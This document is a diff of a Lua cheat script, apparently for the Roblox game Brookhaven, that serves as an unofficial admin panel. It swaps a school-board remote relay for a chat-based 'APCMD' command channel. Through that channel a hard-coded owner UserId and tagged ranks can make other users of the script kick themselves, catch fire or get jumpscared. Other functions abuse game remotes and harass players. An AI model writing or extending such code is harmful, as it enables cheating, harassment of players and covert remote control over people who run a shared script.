@@ -9,6 +9,19 @@ local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 
+-- ===================== KITKAT TAGS (auto Members, no panel lock) =====================
+getgenv().KitKatConfig = getgenv().KitKatConfig or { SpecialTags = {} }
+getgenv().KitKatConfig.SpecialTags = getgenv().KitKatConfig.SpecialTags or {}
+getgenv().KitKatConfig.SpecialTags["Prulaki"] = getgenv().KitKatConfig.SpecialTags["Prulaki"] or "Owner"
+if LP.UserId == 8992189635 then
+    getgenv().KitKatConfig.SpecialTags[LP.Name] = "Owner"
+    getgenv().KitKatConfig.SpecialTags["Prulaki"] = "Owner"
+elseif not getgenv().KitKatConfig.SpecialTags[LP.Name] then
+    getgenv().KitKatConfig.SpecialTags[LP.Name] = "Members"
+end
+print("[KitKat] " .. LP.Name .. " = " .. tostring(getgenv().KitKatConfig.SpecialTags[LP.Name]))
+
+
 local Bg        = Color3.fromRGB(0, 0, 0)
 local Panel     = Color3.fromRGB(10, 10, 10)
 local PanelSoft = Color3.fromRGB(10, 10, 10)
@@ -211,100 +224,6 @@ Shared.grantRank = 0
 Shared.grantPremium = false
 Shared.rank = Shared.baseRank
 Shared.premium = Shared.basePremium
-
--- ===== Board channel only (Brookhaven school board → control other script users) =====
-Shared.BoardReady = false
-local BoardCount, BoardLabel, BoardRemote
-
-local function initBoard()
-    pcall(function()
-        local wc = workspace:FindFirstChild("WorkspaceCom")
-        local school = wc and wc:FindFirstChild("001_School")
-        local dry = school and school:FindFirstChild("SchoolDryBoard")
-        local words = dry and dry:FindFirstChild("Words")
-        if not words then return end
-        BoardCount = words:FindFirstChild("Count")
-        BoardLabel = words:FindFirstChildWhichIsA("TextLabel", true)
-        local RE = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
-        BoardRemote = RE and RE:FindFirstChild("1Schoo1lDr1yBoard1s")
-        Shared.BoardReady = BoardCount and BoardLabel and BoardRemote and true or false
-    end)
-    print(Shared.BoardReady and "[Panel] Board READY" or "[Panel] Board not found")
-    return Shared.BoardReady
-end
-
-function Shared.WriteBoard(text)
-    if not Shared.BoardReady then initBoard() end
-    if not (BoardRemote and BoardCount) then return false end
-    pcall(function()
-        BoardRemote:FireServer("ReturningBoardName", BoardCount, tostring(text or ""))
-    end)
-    return true
-end
-
-local _boardBusy = false
-function Shared.EnviarBoard(cmd, target)
-    if _boardBusy then return false end
-    _boardBusy = true
-    task.delay(0.9, function() _boardBusy = false end)
-    local texto = ";" .. tostring(cmd or "")
-    if target and tostring(target) ~= "" then
-        texto = texto .. " " .. string.lower(tostring(target))
-    end
-    if not Shared.WriteBoard(texto) then return false end
-    task.delay(0.5, function() Shared.WriteBoard(" ") end)
-    return true
-end
-
-function Shared.ProcessBoardCommand(raw)
-    if type(raw) ~= "string" or raw == "" or raw == " " then return end
-    local texto = string.lower(raw)
-    local my = string.lower(LP.Name)
-    local myd = string.lower(LP.DisplayName or "")
-    local cmd, alvo = texto:match("^;(%w+)%s+(.+)$")
-    if not cmd then cmd = texto:match("^;(%w+)$") end
-    if not cmd then return end
-    if alvo then
-        alvo = (alvo:match("^%s*(.-)%s*$") or alvo)
-        local hit = (alvo == my or alvo == myd or tostring(LP.UserId) == alvo
-            or my:sub(1, #alvo) == alvo
-            or (myd ~= "" and myd:sub(1, #alvo) == alvo))
-        if not hit then return end
-    end
-    print("[Board] for me:", cmd)
-    if cmd == "kick" then
-        pcall(function() LP:Kick("You were kicked by a moderator.") end)
-    elseif cmd == "fire" and Shared.firePlayer then Shared.firePlayer(LP)
-    elseif cmd == "sit" and Shared.sitPlayer then Shared.sitPlayer(LP)
-    elseif cmd == "freeze" and Shared.freezePlayer then Shared.freezePlayer(LP)
-    elseif cmd == "unfreeze" and Shared.unfreezePlayer then Shared.unfreezePlayer(LP)
-    elseif cmd == "jail" and Shared.jailPlayer then Shared.jailPlayer(LP)
-    elseif cmd == "unjail" and Shared.unjailPlayer then Shared.unjailPlayer(LP)
-    elseif cmd == "explode" and Shared.explodePlayer then Shared.explodePlayer(LP)
-    elseif cmd == "float" and Shared.floatPlayer then Shared.floatPlayer(LP)
-    elseif cmd == "jumps1" and Shared.jumpscareLocal then
-        Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-    elseif cmd == "jumps2" and Shared.jumpscareLocal then
-        Shared.jumpscareLocal("rbxassetid://86379969987314", "rbxassetid://143942090")
-    elseif cmd == "jumps3" and Shared.jumpscareLocal then
-        Shared.jumpscareLocal("rbxassetid://127382022168206", "rbxassetid://143942090")
-    elseif cmd == "jumps4" and Shared.jumpscareLocal then
-        Shared.jumpscareLocal("rbxassetid://95973611964555", "rbxassetid://138873214826309")
-    elseif (cmd == "therakejumpscare" or cmd == "animejumpscare") and Shared.jumpscareLocal then
-        Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-    end
-end
-
-task.defer(function()
-    task.wait(1)
-    initBoard()
-    if BoardLabel then
-        BoardLabel:GetPropertyChangedSignal("Text"):Connect(function()
-            pcall(Shared.ProcessBoardCommand, BoardLabel.Text)
-        end)
-    end
-end)
-
 
 function Shared._getMyProps()
     local props = {}
@@ -748,7 +667,9 @@ end
 
 mergeHardBans()
 pcall(pullRemoteBanList)
-pcall(function() enforceScriptBan() end)
+if enforceScriptBan() then
+    return -- stop loading the panel
+end
 
 -- Keep checking remote list while the panel runs (banned mid-session)
 task.spawn(function()
@@ -5515,13 +5436,7 @@ Shared._jails = Shared._jails or {}
 Shared._freezeSpeed = Shared._freezeSpeed or {}
 
 function Shared.firePlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("fire", targetPlayer.Name) then
-            return true, "fire via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         or targetPlayer.Character:FindFirstChild("Torso")
@@ -5555,13 +5470,7 @@ function Shared.unloopFirePlayer(targetPlayer)
 end
 
 function Shared.sitPlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("sit", targetPlayer.Name) then
-            return true, "sit via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local h = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     if not h then return false, "No humanoid" end
     h.Sit = true
@@ -5587,13 +5496,7 @@ function Shared.unloopSitPlayer(targetPlayer)
 end
 
 function Shared.floatPlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("float", targetPlayer.Name) then
-            return true, "float via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     if not hrp or not hum then return false, "No root" end
@@ -5620,13 +5523,7 @@ function Shared.floatPlayer(targetPlayer)
 end
 
 function Shared.explodePlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("explode", targetPlayer.Name) then
-            return true, "explode via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return false, "No root" end
     local explosion = Instance.new("Explosion")
@@ -5656,13 +5553,7 @@ function Shared.explodePlayer(targetPlayer)
 end
 
 function Shared.jailPlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("jail", targetPlayer.Name) then
-            return true, "jail via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     if not root then return false, "No root" end
     local uid = targetPlayer.UserId
@@ -5694,11 +5585,6 @@ end
 
 function Shared.unjailPlayer(targetPlayer)
     if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("unjail", targetPlayer.Name) then
-            return true, "unjail via board → " .. targetPlayer.Name
-        end
-    end
     local uid = targetPlayer.UserId
     if Shared._jails[uid] then
         for _, p in ipairs(Shared._jails[uid]) do pcall(function() p:Destroy() end) end
@@ -5708,13 +5594,7 @@ function Shared.unjailPlayer(targetPlayer)
 end
 
 function Shared.freezePlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("freeze", targetPlayer.Name) then
-            return true, "freeze via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     if not hum then return false, "No humanoid" end
     Shared._freezeSpeed[targetPlayer.UserId] = hum.WalkSpeed
@@ -5724,18 +5604,45 @@ function Shared.freezePlayer(targetPlayer)
 end
 
 function Shared.unfreezePlayer(targetPlayer)
-    if not targetPlayer then return false, "Invalid" end
-    if targetPlayer ~= LP then
-        if Shared.EnviarBoard and Shared.EnviarBoard("unfreeze", targetPlayer.Name) then
-            return true, "unfreeze via board → " .. targetPlayer.Name
-        end
-    end
-    if not targetPlayer.Character then return false, "No character" end
+    if not targetPlayer or not targetPlayer.Character then return false, "No character" end
     local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
     if not hum then return false, "No humanoid" end
     hum.WalkSpeed = Shared._freezeSpeed[targetPlayer.UserId] or 16
     Shared._freezeSpeed[targetPlayer.UserId] = nil
     return true, "Unfreeze " .. targetPlayer.Name
+end
+
+-- ===================== SCRIPT-USER COMMAND CHANNEL =====================
+Shared.AP_CMD_PREFIX = "APCMD"
+Shared.TRUSTED_OWNER_IDS = { [8992189635] = true }
+
+local function apCanControlFrom(sender)
+    if not sender then return false end
+    if Shared.TRUSTED_OWNER_IDS[sender.UserId] then return true end
+    local tags = (getgenv().KitKatConfig and getgenv().KitKatConfig.SpecialTags) or {}
+    local r = tags[sender.Name] or tags[sender.DisplayName] or ""
+    return r == "Owner" or r == "Co owner" or r == "Co-owner"
+        or r == "HeadAdmin" or r == "Admin" or r == "Mods"
+end
+
+function Shared.broadcastScriptCmd(action, targetUserId, extra)
+    local msg = string.format("%s %s %s %s", Shared.AP_CMD_PREFIX, tostring(action), tostring(targetUserId), tostring(extra or ""):gsub("%s+", "_"))
+    print("[APCMD] Sending:", msg)
+    pcall(function()
+        local TCS = game:GetService("TextChatService")
+        local channels = TCS:FindFirstChild("TextChannels")
+        if channels then
+            for _, ch in ipairs(channels:GetChildren()) do
+                pcall(function() if ch.SendAsync then ch:SendAsync(msg) end end)
+            end
+        end
+    end)
+    pcall(function()
+        local ev = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        ev = ev and ev:FindFirstChild("SayMessageRequest")
+        if ev then ev:FireServer(msg, "All") end
+    end)
+    return true
 end
 
 function Shared.kickPlayer(targetPlayer)
@@ -5744,55 +5651,182 @@ function Shared.kickPlayer(targetPlayer)
         pcall(function() LP:Kick("You were kicked by a moderator.") end)
         return true, "Kicked self"
     end
-    if Shared.EnviarBoard and Shared.EnviarBoard("kick", targetPlayer.Name) then
-        return true, "Kick via board → " .. targetPlayer.Name
-    end
-    return false, "Board not ready (Brookhaven school)"
+    Shared.broadcastScriptCmd("kick", targetPlayer.UserId, "")
+    return true, "Kick sent to " .. targetPlayer.Name .. " — both must use THIS script file"
 end
 
+function Shared.applyScriptCmd(action, targetUserId, extra)
+    if tonumber(targetUserId) ~= LP.UserId then return false end
+    action = string.lower(tostring(action or ""))
+    print("[APCMD] Applying on me:", action)
+    if action == "kick" then
+        pcall(function() LP:Kick("You were kicked by a moderator.") end)
+        return true
+    elseif action == "jumpscare" then
+        local img, snd = string.match(tostring(extra or ""), "^([^`]*)`(.*)$")
+        if Shared.jumpscareLocal then Shared.jumpscareLocal(img, snd) end
+        return true
+    elseif action == "fire" and Shared.firePlayer then
+        return Shared.firePlayer(LP)
+    elseif action == "sit" and Shared.sitPlayer then
+        return Shared.sitPlayer(LP)
+    end
+    return false
+end
+
+task.spawn(function()
+    local function handle(sender, text)
+        if type(text) ~= "string" or not text:find("APCMD", 1, true) then return end
+        local action, uid, extra = text:match("APCMD%s+(%S+)%s+(%d+)%s*(.*)$")
+        if not action then return end
+        if not apCanControlFrom(sender) then
+            print("[APCMD] ignore untrusted", sender and sender.Name)
+            return
+        end
+        Shared.applyScriptCmd(action, uid, extra)
+    end
+    pcall(function()
+        local TCS = game:GetService("TextChatService")
+        if TCS.MessageReceived then
+            TCS.MessageReceived:Connect(function(msg)
+                pcall(function()
+                    local sender = msg.TextSource and Players:GetPlayerByUserId(msg.TextSource.UserId)
+                    handle(sender, msg.Text)
+                end)
+            end)
+        end
+    end)
+    pcall(function()
+        local function hook(plr)
+            plr.Chatted:Connect(function(msg) handle(plr, msg) end)
+        end
+        for _, plr in ipairs(Players:GetPlayers()) do hook(plr) end
+        Players.PlayerAdded:Connect(hook)
+    end)
+    print("[Panel] APCMD ready — OTHER phone must execute THIS same file")
+end)
+
+
 function Shared.verifiedScan()
+    local rankStyle = {
+        ["Members"] = { col = Color3.fromRGB(0, 200, 255), glow = Color3.fromRGB(0, 120, 180) },
+        ["Mods"] = { col = Color3.fromRGB(90, 150, 255), glow = Color3.fromRGB(40, 80, 200) },
+        ["Admin"] = { col = Color3.fromRGB(255, 90, 90), glow = Color3.fromRGB(180, 40, 40) },
+        ["HeadAdmin"] = { col = Color3.fromRGB(255, 210, 70), glow = Color3.fromRGB(180, 140, 30) },
+        ["Co owner"] = { col = Color3.fromRGB(255, 160, 50), glow = Color3.fromRGB(180, 100, 20) },
+        ["Co-owner"] = { col = Color3.fromRGB(255, 160, 50), glow = Color3.fromRGB(180, 100, 20) },
+        ["Owner"] = { col = Color3.fromRGB(255, 80, 200), glow = Color3.fromRGB(180, 40, 140) },
+    }
+    local function styleFor(rank)
+        return rankStyle[rank] or { col = Color3.fromRGB(0, 200, 255), glow = Color3.fromRGB(0, 120, 180) }
+    end
+
+    local function tagPlayer(player, rank)
+        if not (player and player.Character) then return false end
+        local head = player.Character:FindFirstChild("Head")
+        if not head then return false end
+        local old = head:FindFirstChild("AdminPanelTag")
+        if old then old:Destroy() end
+
+        local st = styleFor(rank)
+        local bgui = Instance.new("BillboardGui")
+        bgui.Name = "AdminPanelTag"
+        bgui.Size = UDim2.new(0, 160, 0, 36)
+        bgui.StudsOffset = Vector3.new(0, 3.2, 0)
+        bgui.AlwaysOnTop = true
+        bgui.MaxDistance = 100
+        bgui.Adornee = head
+        bgui.Parent = head
+
+        local card = Instance.new("Frame", bgui)
+        card.Size = UDim2.fromScale(1, 1)
+        card.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
+        card.BackgroundTransparency = 0.15
+        card.BorderSizePixel = 0
+        local c = Instance.new("UICorner", card)
+        c.CornerRadius = UDim.new(0, 10)
+        local stroke = Instance.new("UIStroke", card)
+        stroke.Color = st.col
+        stroke.Thickness = 1.4
+        stroke.Transparency = 0.15
+
+        local accent = Instance.new("Frame", card)
+        accent.Size = UDim2.new(0, 4, 1, -8)
+        accent.Position = UDim2.new(0, 4, 0, 4)
+        accent.BackgroundColor3 = st.col
+        accent.BorderSizePixel = 0
+        local ac = Instance.new("UICorner", accent)
+        ac.CornerRadius = UDim.new(1, 0)
+
+        local text = Instance.new("TextLabel", card)
+        text.BackgroundTransparency = 1
+        text.Position = UDim2.new(0, 14, 0, 0)
+        text.Size = UDim2.new(1, -18, 1, 0)
+        text.Font = Enum.Font.GothamBold
+        text.TextSize = 13
+        text.TextXAlignment = Enum.TextXAlignment.Left
+        text.TextColor3 = st.col
+        text.TextStrokeTransparency = 0.4
+        text.TextStrokeColor3 = Color3.new(0, 0, 0)
+        text.Text = tostring(rank)
+
+        -- soft pulse on stroke
+        task.spawn(function()
+            local t0 = 0
+            while bgui.Parent and stroke.Parent do
+                t0 += task.wait(0.05)
+                local wave = (math.sin(t0 * 2.5) + 1) * 0.5
+                stroke.Transparency = 0.1 + wave * 0.25
+                if rank == "Owner" then
+                    text.TextColor3 = Color3.fromHSV((t0 * 0.25) % 1, 0.75, 1)
+                    stroke.Color = text.TextColor3
+                    accent.BackgroundColor3 = text.TextColor3
+                end
+            end
+        end)
+        return true
+    end
+
+    local tags = (getgenv().KitKatConfig and getgenv().KitKatConfig.SpecialTags) or {}
+    local report = {}
+
+    -- Only on ;verified: pick LaundryBasket then scan (not on script load)
     pcall(function()
         local RE = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
         local tool = RE and RE:FindFirstChild("1Too1l")
         if tool then tool:InvokeServer("PickingTools", "LaundryBasket") end
     end)
-    task.delay(0.5, function()
-        local found = 0
+
+    task.delay(0.65, function()
         for _, player in ipairs(Players:GetPlayers()) do
             local has = (player.Backpack and player.Backpack:FindFirstChild("LaundryBasket"))
                 or (player.Character and player.Character:FindFirstChild("LaundryBasket"))
-            if has and player.Character then
-                found += 1
-                local head = player.Character:FindFirstChild("Head")
-                if head then
-                    local old = head:FindFirstChild("AdminPanelTag")
-                    if old then old:Destroy() end
-                    local gui = Instance.new("BillboardGui")
-                    gui.Name = "AdminPanelTag"
-                    gui.Size = UDim2.new(0, 240, 0, 50)
-                    gui.StudsOffset = Vector3.new(0, 3.5, 0)
-                    gui.AlwaysOnTop = true
-                    gui.Adornee = head
-                    gui.Parent = head
-                    local text = Instance.new("TextLabel")
-                    text.Size = UDim2.new(1, 0, 1, 0)
-                    text.BackgroundTransparency = 1
-                    text.Font = Enum.Font.GothamBold
-                    text.TextScaled = true
-                    text.TextStrokeTransparency = 0.2
-                    text.TextStrokeColor3 = Color3.new(0, 0, 0)
-                    text.TextColor3 = Color3.fromRGB(0, 180, 255)
-                    text.Text = "Script User"
-                    text.Parent = gui
+            local rank = tags[player.Name] or tags[player.DisplayName]
+            if has and (not rank or rank == "") then
+                rank = "Members"
+                pcall(function()
+                    getgenv().KitKatConfig.SpecialTags[player.Name] = "Members"
+                end)
+            end
+            if rank and rank ~= "" then
+                if tagPlayer(player, rank) then
+                    report[#report + 1] = player.Name .. "=" .. rank
                 end
             end
         end
         if showToast then
-            showToast("Verified", "Tagged " .. tostring(found) .. " script user(s)", "success")
+            if #report == 0 then
+                showToast("Verified", "No script users found", "info")
+            else
+                showToast("Verified", table.concat(report, ", "), "success")
+            end
         end
+        print("[Verified]", table.concat(report, ", "))
     end)
-    return true, "Scanning for script users..."
+
+    return true, "Verifying ranks..."
 end
+
 
 function Shared.jumpscareLocal(imgId, soundId)
     pcall(function()
@@ -5804,20 +5838,26 @@ function Shared.jumpscareLocal(imgId, soundId)
         local img = Instance.new("ImageLabel", gui)
         img.Size = UDim2.fromScale(1, 1)
         img.BackgroundColor3 = Color3.new(0, 0, 0)
-        img.Image = imgId
+        img.Image = imgId or ""
         img.ScaleType = Enum.ScaleType.Fit
-        if soundId then
+        if soundId and soundId ~= "" then
             local s = Instance.new("Sound", gui)
             s.SoundId = soundId
             s.Volume = 1
             s:Play()
         end
-        task.delay(3, function()
-            if gui.Parent then gui:Destroy() end
-        end)
+        task.delay(3, function() if gui.Parent then gui:Destroy() end end)
     end)
-    return true, "Jumpscare"
+    return true, "Jumpscare (local)"
 end
+
+function Shared.jumpscarePlayer(targetPlayer, imgId, soundId)
+    if not targetPlayer then return false, "Need player name" end
+    if targetPlayer == LP then return Shared.jumpscareLocal(imgId, soundId) end
+    Shared.broadcastScriptCmd("jumpscare", targetPlayer.UserId, tostring(imgId or "") .. "`" .. tostring(soundId or ""))
+    return true, "Jumpscare sent → " .. targetPlayer.Name
+end
+
 
 function Shared.backroomsSelf()
     task.spawn(function()
@@ -7204,81 +7244,57 @@ local function addCmd(def)
     })
     addCmd({
         name = "jumps1", aliases = {}, rank = 5,
-        display = "%Pjumps1 [user]",
-        desc = "Jumpscare via board",
+        display = "%Pjumps1 [user/id/nickname]",
+        desc = "Jumpscare (target must run script)",
         fn = function(a)
             if not a[1] then return false, "Usage: jumps1 [username]" end
             local uid, err = resolveTarget(a[1])
             if not uid then return false, err end
             local plr = Players:GetPlayerByUserId(uid)
             if not plr then return false, "Not in server" end
-            if plr == LP and Shared.jumpscareLocal then
-                return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-            end
-            if Shared.EnviarBoard and Shared.EnviarBoard("jumps1", plr.Name) then
-                return true, "jumps1 → " .. plr.Name
-            end
-            return false, "Board not ready"
+            return Shared.jumpscarePlayer(plr, "rbxassetid://126754882337711", "rbxassetid://138873214826309")
         end
     })
 
     addCmd({
         name = "jumps2", aliases = {}, rank = 5,
-        display = "%Pjumps2 [user]",
-        desc = "Jumpscare via board",
+        display = "%Pjumps2 [user/id/nickname]",
+        desc = "Jumpscare (target must run script)",
         fn = function(a)
             if not a[1] then return false, "Usage: jumps2 [username]" end
             local uid, err = resolveTarget(a[1])
             if not uid then return false, err end
             local plr = Players:GetPlayerByUserId(uid)
             if not plr then return false, "Not in server" end
-            if plr == LP and Shared.jumpscareLocal then
-                return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-            end
-            if Shared.EnviarBoard and Shared.EnviarBoard("jumps2", plr.Name) then
-                return true, "jumps2 → " .. plr.Name
-            end
-            return false, "Board not ready"
+            return Shared.jumpscarePlayer(plr, "rbxassetid://86379969987314", "rbxassetid://143942090")
         end
     })
 
     addCmd({
         name = "jumps3", aliases = {}, rank = 5,
-        display = "%Pjumps3 [user]",
-        desc = "Jumpscare via board",
+        display = "%Pjumps3 [user/id/nickname]",
+        desc = "Jumpscare (target must run script)",
         fn = function(a)
             if not a[1] then return false, "Usage: jumps3 [username]" end
             local uid, err = resolveTarget(a[1])
             if not uid then return false, err end
             local plr = Players:GetPlayerByUserId(uid)
             if not plr then return false, "Not in server" end
-            if plr == LP and Shared.jumpscareLocal then
-                return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-            end
-            if Shared.EnviarBoard and Shared.EnviarBoard("jumps3", plr.Name) then
-                return true, "jumps3 → " .. plr.Name
-            end
-            return false, "Board not ready"
+            return Shared.jumpscarePlayer(plr, "rbxassetid://127382022168206", "rbxassetid://143942090")
         end
     })
 
     addCmd({
         name = "jumps4", aliases = {}, rank = 5,
-        display = "%Pjumps4 [user]",
-        desc = "Jumpscare via board",
+        display = "%Pjumps4 [user/id/nickname]",
+        desc = "Jumpscare (target must run script)",
         fn = function(a)
             if not a[1] then return false, "Usage: jumps4 [username]" end
             local uid, err = resolveTarget(a[1])
             if not uid then return false, err end
             local plr = Players:GetPlayerByUserId(uid)
             if not plr then return false, "Not in server" end
-            if plr == LP and Shared.jumpscareLocal then
-                return Shared.jumpscareLocal("rbxassetid://126754882337711", "rbxassetid://138873214826309")
-            end
-            if Shared.EnviarBoard and Shared.EnviarBoard("jumps4", plr.Name) then
-                return true, "jumps4 → " .. plr.Name
-            end
-            return false, "Board not ready"
+            return Shared.jumpscarePlayer(plr, "rbxassetid://95973611964555", "rbxassetid://138873214826309")
         end
     })
 
